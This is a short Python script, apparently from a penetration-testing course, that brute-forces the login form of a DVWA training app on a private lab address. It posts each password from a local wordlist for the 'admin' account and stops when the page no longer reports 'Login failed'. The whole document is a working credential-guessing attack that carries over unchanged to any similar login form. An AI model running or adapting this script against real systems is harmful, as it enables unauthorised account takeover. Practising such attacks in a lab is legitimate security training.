#!/usr/bin/env python

import requests

"""
Always check the url, the method and the names of the keys 
in the dictionary, which will be the name of the input in 
the html code of the boxes. The value is whatever you want to
write inside the box
"""

target_url = "http://192.168.30.137/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("/root/PycharmProjects/post/passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode():
        # if "Login failed" not in str(response.content):
        # if b"Login failed" not in str(response.content):
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line.")
